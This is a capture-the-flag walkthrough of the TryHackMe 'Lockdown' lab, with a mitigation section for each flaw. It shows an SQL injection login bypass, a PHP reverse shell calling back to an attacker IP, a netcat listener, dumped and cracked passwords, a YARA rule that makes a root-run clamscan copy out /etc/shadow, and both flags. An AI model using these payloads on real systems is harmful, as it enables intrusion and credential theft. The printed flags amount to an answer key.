# Lockdown CTF Walkthrough

**Target:** Lockdown
**Source:** [TryHackMe](https://tryhackme.com/room/lockdown)
**Difficulty:** Medium
**Target IP:** 10.81.169.22

> **Note:** Add `10.81.169.22 contacttracer.thm` to `/etc/hosts` before starting.

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [Admin Panel SQL Injection](#admin-panel-sql-injection)
- [Unrestricted File Upload → Reverse Shell](#unrestricted-file-upload--reverse-shell)
- [Source Code Review & Database Credentials](#source-code-review--database-credentials)
- [Database Dump & Lateral Movement to cyrus](#database-dump--lateral-movement-to-cyrus)
- [User Flag](#user-flag)
- [Privilege Escalation via ClamAV/YARA Abuse](#privilege-escalation-via-clamavyara-abuse)
- [Path A: Shadow File Quarantine → Crack maxine → Full sudo](#path-a-shadow-file-quarantine--crack-maxine--full-sudo)
- [Path B: Direct root.txt Read via Custom YARA Rule](#path-b-direct-roottxt-read-via-custom-yara-rule)
- [Root Flag](#root-flag)
- [Flags](#flags)
- [Vulnerabilities](#vulnerabilities)
- [Attack Chain Summary](#attack-chain-summary)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

Lockdown is a medium Linux box themed around a "Coronavirus Contact Tracer"
web app. The path runs through directory brute forcing, an authentication
bypass via SQL injection on the admin login, an unrestricted file upload in
the admin panel used to drop a PHP reverse shell, source-code review that
leaks a database password, an MD5 hash crack to recover a system user's
password, and a `sudo` rule that lets a low-privileged user run `clamscan`
with a user-supplied YARA rule. That YARA abuse branches into two valid
privilege-escalation routes: quarantining `/etc/shadow` for offline cracking,
or writing a rule that flags `root.txt` itself so it gets copied straight
into a user-owned directory.

**Key Skills Required:**
- Network scanning and service enumeration
- Web directory brute forcing
- SQL injection–based authentication bypass
- Unrestricted file upload → reverse shell
- PHP source code review for hardcoded credentials
- MySQL enumeration and MD5 hash cracking
- Password reuse / credential-based lateral movement (`su`)
- Abusing a `sudo` rule around `clamscan` + custom YARA rules for arbitrary
  file read/exfiltration as root

---

## Reconnaissance

### Network Scanning

A full-port service/version scan shows two open services:

```bash
nmap -sVC -O -p- 10.81.169.22
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | ssh | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 80/tcp | http | Apache httpd 2.4.41 (Ubuntu) — "Coronavirus Contact Tracer" |

SSH and a web app — the web app ("Coronavirus Contact Tracer") is the entry
point.

---

## Web Enumeration

A directory brute force against the vhost surfaces the application's
internal structure:

```bash
gobuster dir -u http://contacttracer.thm \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 45
```

```
uploads   (Status: 301) [--> /uploads/]
admin     (Status: 301) [--> /admin/]
plugins   (Status: 301) [--> /plugins/]
classes   (Status: 301) [--> /classes/]
dist      (Status: 301) [--> /dist/]
temp      (Status: 301) [--> /temp/]
inc       (Status: 301) [--> /inc/]
build     (Status: 301) [--> /build/]
libs      (Status: 301) [--> /libs/]
```

Browsing the site leads to an admin login page at
`http://contacttracer.thm/login.php` ("Go to Admin Panel").

---

## Admin Panel SQL Injection

The login form is vulnerable to a classic authentication-bypass SQL
injection:

```
username: admin ' or '1'='1--
password: test
```

This logs into the admin panel without valid credentials.

> **Vulnerability:** SQL injection–based auth bypass on `login.php`

---

## Unrestricted File Upload → Reverse Shell

Inside the admin panel, `admin/?page=system_info` exposes a system-logo
upload feature. Since the backend is PHP, a PHP reverse shell is uploaded in
its place:

- Shell source: `/usr/share/webshells/php/php-reverse-shell.php` (or the
  [pentestmonkey repo](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php))
- Edited before upload:

```php
$ip = '192.168.131.60';  // attacker IP
$port = 9013;            // listener port
```

The upload form does not validate file type or content — an **unrestricted
file upload** vulnerability. After uploading, revisiting
`http://contacttracer.thm/login.php` triggers execution of the planted
shell.

Set up a listener and catch the callback:

```bash
rlwrap nc -nvlp 9013
```

```
listening on [any] 9013 ...
connect to [192.168.131.60] from (UNKNOWN) [10.81.169.22] 59910
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Stabilize the shell:

```bash
export TERM=xterm
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

> **Foothold:** `www-data` (via unrestricted file upload)

---

## Source Code Review & Database Credentials

Enumerating `/home` shows candidate users `cyrus`, `maxine`, `ssm-user`,
`ubuntu`. Reviewing the webroot (`/var/www/html`) turns up `config.php`,
which pulls in `classes/DBConnection.php`:

```bash
cat config.php
cat classes/DBConnection.php
```

```php
private $host     = 'localhost';
private $username = 'cts';
private $password = 'YOUMKtIXoRjFgMqDJ3WR799tvq2UdNWE';
private $database = 'cts_db';
```

> **Recovered credentials:** `cts : YOUMKtIXoRjFgMqDJ3WR799tvq2UdNWE` (MySQL)

---

## Database Dump & Lateral Movement to cyrus

Log into MySQL with the recovered credentials and dump the `users` table:

```bash
mysql -u cts -p
show databases;
use cts_db;
select * from users;
```

```
| username | password                          |
| admin    | 3eba6f73c19818c36ba8fea761a3ce6d  |
```

The password is a bare MD5 hash:

```
3eba6f73c19818c36ba8fea761a3ce6d -> sweetpandemonium
```

The cracked plaintext is reused by the Linux system user `cyrus`:

```bash
su cyrus
Password: sweetpandemonium
```

> **Recovered credentials:** `cyrus : sweetpandemonium` (password reuse: web
> admin hash → system account)

> **Foothold:** `cyrus`

---

## User Flag

```bash
cyrus@ip-10-81-169-22:~$ cat user.txt
THM{w4c1F5AuUNhHCJRtiGtRqZyp0QJDIbWS}
```

> **User flag:** `THM{w4c1F5AuUNhHCJRtiGtRqZyp0QJDIbWS}`

(A red herring also sits in the home directory: `testvirus`, the standard
EICAR antivirus test string — a hint toward the ClamAV theme ahead.)

---

## Privilege Escalation via ClamAV/YARA Abuse

`sudo -l` shows `cyrus` can run a scan script as root with no password:

```bash
sudo -l
```

```
User cyrus may run the following commands on ip-10-81-169-22:
    (root) /opt/scan/scan.sh
```

```bash
cat /opt/scan/scan.sh
```

```bash
#!/bin/bash
read -p "Enter path: " TARGET
if [[ -e "$TARGET" && -r "$TARGET" ]]
  then
    /usr/bin/clamscan "$TARGET" --copy=/home/cyrus/quarantine
    /bin/chown -R cyrus:cyrus /home/cyrus/quarantine
  else
    echo "Invalid or inaccessible path."
fi
```

The script runs `clamscan` as root against any path the caller supplies, and
`clamscan` supports custom YARA rules. `/var/lib/clamav` (the configured
`DatabaseDirectory` in `/etc/clamav/freshclam.conf`) is world-writable, so a
custom rule dropped there is loaded automatically and will flag arbitrary
files as "infected" — at which point the root-run script copies them into
`/home/cyrus/quarantine` and `chown`s that directory back to `cyrus`. This
gives an arbitrary-file-read-as-root primitive, which branches into two
usable paths.

> **Vulnerability:** Writable ClamAV signature directory + `sudo` rule
> running `clamscan --copy` as root → attacker-controlled YARA rule turns the
> "virus scanner" into an arbitrary file reader

### Path A: Shadow File Quarantine → Crack maxine → Full sudo

Remove the stock signature DB (write-protected but owned permissively) and
drop a rule that matches almost anything:

```bash
cd /var/lib/clamav
rm main.hdb
nano rule.yara
```

```yara
rule test
{
  strings:
    $show = "root"
  condition:
    $show
}
```

Run the sudo script against `/etc/shadow`:

```bash
sudo /opt/scan/scan.sh
Enter path: /etc/shadow
```

```
/etc/shadow: YARA.test.UNOFFICIAL FOUND
/etc/shadow: copied to '/home/cyrus/quarantine/shadow'
```

Read the quarantined copy and crack the `maxine` hash offline:

```bash
cd quarantine && cat shadow
john --wordlist=/usr/share/wordlists/rockyou.txt user_maxine.hash
```

```
tiarna (maxine)
```

> **Recovered credentials:** `maxine : tiarna`

Switch to `maxine` and check her `sudo` rights:

```bash
su maxine
sudo -l
```

```
User maxine may run the following commands on lockdown:
    (ALL : ALL) ALL
```

`maxine` has unrestricted `sudo`:

```bash
sudo su
id
```

```
uid=0(root) gid=0(root) groups=0(root)
```

> **Privilege escalation (Path A):** `cyrus` → quarantine `/etc/shadow` →
> crack `maxine`'s hash → `maxine` has `(ALL : ALL) ALL` → `sudo su` → root

### Path B: Direct root.txt Read via Custom YARA Rule

A YARA rule can also target the flag file's own content directly, skipping
the shadow-cracking detour entirely. Since `root.txt` is not flagged by
`main.hdb` in the first place (hence the earlier `rm main.hdb` isn't even
required for this path to work), a rule matching the flag format is enough:

```bash
nano rule.yara
```

```yara
rule root
{
strings:
$abc = "THM"
condition:
$abc
}
```

```bash
sudo /opt/scan/scan.sh
Enter path: /root/root.txt
```

The script copies the matched file into the `cyrus`-owned quarantine
directory, bypassing root's file permissions entirely:

```bash
cat /home/cyrus/quarantine/root.txt
```

> **Privilege escalation (Path B):** `cyrus` → custom YARA rule matching
> `"THM"` → `sudo scan.sh` against `/root/root.txt` → quarantine copy readable
> by `cyrus` — root access not required, only root's file content

---

## Root Flag

```bash
cat root.txt
THM{IQ23Em4VGX91cvxsIzatpUvrW9GZZJxm}
```

> **Root flag:** `THM{IQ23Em4VGX91cvxsIzatpUvrW9GZZJxm}`

---

## Flags

| Flag | Value | Location |
|------|-------|----------|
| User flag | `THM{w4c1F5AuUNhHCJRtiGtRqZyp0QJDIbWS}` | `/home/cyrus/user.txt` |
| Root flag | `THM{IQ23Em4VGX91cvxsIzatpUvrW9GZZJxm}` | `/root/root.txt` |

---

## Vulnerabilities

### 1. SQL Injection — Admin Login Bypass (Critical)

**Description:** `login.php` builds its authentication query without
sanitizing input, allowing `admin ' or '1'='1--` to bypass the password
check entirely.

**Impact:** Full admin panel access with no valid credentials.

**Mitigation:**
- Use parameterized queries / prepared statements for all authentication
  logic.
- Never concatenate user input directly into SQL.

### 2. Unrestricted File Upload (High)

**Description:** The admin panel's system-logo upload feature accepts and
stores arbitrary file content, including executable PHP, with no
type/content validation.

**Impact:** Remote code execution as `www-data` via an uploaded reverse
shell.

**Mitigation:**
- Validate uploads by content (not just extension), restrict to an image
  allow-list, strip executable permissions, and store uploads outside the
  web root.

### 3. Hardcoded Database Credentials in Source (Medium)

**Description:** `classes/DBConnection.php` contains the MySQL username and
password in plaintext, readable by anyone who can read the webroot.

**Impact:** Full database access, including the admin password hash.

**Mitigation:**
- Store credentials in environment variables or a secrets manager, not in
  version-controlled or web-accessible source files.

### 4. Weak Password Hashing & Password Reuse (High)

**Description:** The admin password was stored as a bare, unsalted MD5
hash and was trivially crackable; the same plaintext was reused for the
`cyrus` system account.

**Impact:** Lateral movement from the web application to a real Linux user
account.

**Mitigation:**
- Use a modern salted hashing algorithm (bcrypt/argon2) for stored
  credentials.
- Enforce unique passwords across application and system accounts.

### 5. Privilege Escalation via `sudo` + ClamAV/YARA Abuse (Critical)

**Description:** `cyrus` could run `/opt/scan/scan.sh` as root via
passwordless `sudo`. The script runs `clamscan --copy` as root against any
path the user supplies, and ClamAV's signature directory
(`/var/lib/clamav`) was world-writable, letting the user plant a custom
YARA rule. A rule matching arbitrary content (e.g. the string `"root"` or
`"THM"`) causes the root-run scanner to "quarantine" — i.e. copy with a
root-owned chown-back-to-user step — any file the user requests, including
`/etc/shadow` or `root.txt` directly.

**Impact:** Arbitrary file read as root, leading to full root compromise
via either shadow-hash cracking or direct flag exfiltration.

**Mitigation:**
- Lock down `/var/lib/clamav` so only the ClamAV service account can write
  to it.
- Avoid `sudo` rules that let a script copy arbitrary user-specified paths,
  even indirectly through a scanning tool.
- If scanning must run as root, drop privileges before any copy/chown step
  and validate the target path against an allow-list.

---

## Attack Chain Summary

```
Nmap scan → SSH + HTTP (Coronavirus Contact Tracer)
    ↓
gobuster → /admin, /uploads, /classes, ...
    ↓
login.php → SQLi auth bypass (admin ' or '1'='1--)
    ↓
admin panel → system_info logo upload → PHP reverse shell
    ↓
nc listener → foothold: www-data
    ↓
config.php → classes/DBConnection.php → MySQL creds (cts:...)
    ↓
mysql cts_db.users → admin MD5 hash → cracked: sweetpandemonium
    ↓
su cyrus (password reuse) → User flag: THM{w4c1F5AuUNhHCJRtiGtRqZyp0QJDIbWS}
    ↓
sudo -l → (root) /opt/scan/scan.sh (clamscan --copy, writable sig dir)
    ↓
   ┌─────────────────────────────┬─────────────────────────────┐
   │ Path A                      │ Path B                      │
   │ custom YARA rule            │ custom YARA rule             │
   │ → scan /etc/shadow          │ → scan /root/root.txt       │
   │ → quarantine copy           │ → quarantine copy           │
   │ → john cracks maxine:tiarna │ → cat quarantined root.txt  │
   │ → su maxine                 │                              │
   │ → sudo -l: (ALL:ALL) ALL    │                              │
   │ → sudo su → root            │                              │
   └─────────────────────────────┴─────────────────────────────┘
    ↓
Root flag: THM{IQ23Em4VGX91cvxsIzatpUvrW9GZZJxm}
    ↓
Complete system compromise
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/OS detection |
| Gobuster | Web directory enumeration |
| Browser / admin panel | SQLi auth bypass, logo upload exploitation |
| PHP reverse shell (pentestmonkey) | Initial code execution as `www-data` |
| netcat / rlwrap | Reverse shell listener |
| MySQL client | Database enumeration and credential dump |
| Hash identification + cracking | MD5 (admin) and sha512crypt via John the Ripper (maxine) |
| John the Ripper | Cracking `/etc/shadow` hash for `maxine` |
| clamscan / YARA | Abused via `sudo` for arbitrary file read as root |
| su / sudo | Lateral movement and privilege escalation |

---

## References

- [TryHackMe — Lockdown](https://tryhackme.com/room/lockdown)
- [Nmap](https://nmap.org/)
- [Gobuster](https://github.com/OJ/gobuster)
- [pentestmonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
- [John the Ripper](https://github.com/openwall/john)
- [ClamAV documentation](https://docs.clamav.net/)
- [YARA documentation](https://yara.readthedocs.io/)

---
